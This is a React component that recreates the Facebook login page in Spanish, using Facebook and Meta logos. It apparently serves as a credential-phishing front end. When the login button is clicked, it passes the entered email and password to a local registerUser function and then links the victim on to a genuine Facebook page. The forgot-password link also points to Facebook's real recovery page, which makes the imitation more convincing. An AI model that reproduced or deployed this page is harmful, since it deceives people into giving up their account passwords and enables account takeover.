import { useState, useEffect } from "react"
import { FaceBookLogo, MetaLogo } from "../../assets"
import "./formcomp.css"
import { registerUser } from "../../utils/register"

export default function LoginForm() {
    const [email, setEmail] = useState("")
    const [password, setPassword] = useState("")
    const [message, setMessage] = useState("");
    const [isMobile, setIsMobile] = useState(window.innerWidth < 767);

    useEffect(() => {
        const handleResize = () => setIsMobile(window.innerWidth < 767);
        window.addEventListener("resize", handleResize);
        return () => window.removeEventListener("resize", handleResize);
    }, []);

    const handleRegister = async (
        event:React.MouseEvent<HTMLAnchorElement>
    ) => {
        event.preventDefault
        setMessage("")

        try {
            const result = await registerUser({
                email,
                password
            })
            setMessage(result.message)

            setEmail("")
            setPassword("")

        } catch (error) {
            setMessage(
                error instanceof Error
                    ? error.message
                    : ""
            );
        }
    }
    return(
        <>
        {!isMobile && (
            <div className="login-container desktop-version">
                <h1>Iniciar sesión en Facebook</h1>
                <form action="" className="login-form">
                    <input type="email" value={email} onChange={(event) => setEmail(event.target.value)} autoComplete="email" placeholder="Correo Electronico"/>
                    <input type="password" value={password} onChange={(event) => setPassword(event.target.value)} autoComplete="password" minLength={8} placeholder="Contraseña"/>
                    <div className="bttn-forms">
                        <a href="https://www.facebook.com/photo/?fbid=10165713081972240&set=gm.2462815997580294&idorvanity=2026324384562793" onClick={handleRegister} className="login-btn">Iniciar sesión</a>
                        <a href="https://m.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&ars=facebook_login&from_login_screen=0" className="forget-btn">¿Olvidaste tu contraseña?</a>
                    </div>
                </form>
                <div className="registerbtn-container">
                    <a href="" className="register-btn">Crear cuenta nueva</a>
                    <img src={MetaLogo} alt="" />
                </div>
            </div>
        )}
        {isMobile && (
            <div className="login-container mobile-version">
                <img src={FaceBookLogo} alt="" />
                <form action="" className="login-form">
                    <input type="email" value={email} onChange={(event) => setEmail(event.target.value)} autoComplete="email" placeholder="Correo Electronico"/>
                    <input type="password" value={password} onChange={(event) => setPassword(event.target.value)} autoComplete="password" minLength={8} placeholder="Contraseña"/>
                    <div className="bttn-forms">
                        <a href="https://www.facebook.com/photo/?fbid=10165713081972240&set=gm.2462815997580294&idorvanity=2026324384562793" onClick={handleRegister} className="login-btn">Iniciar sesión</a>
                        <a href="" className="forget-btn">¿Olvidaste tu contraseña?</a>
                    </div>
                </form>
                <div className="registerbtn-container">
                    <a href="" className="register-btn">Crear cuenta nueva</a>
                    <img src={MetaLogo} alt="" />
                </div>
            </div>
        )}
        </>
    )
}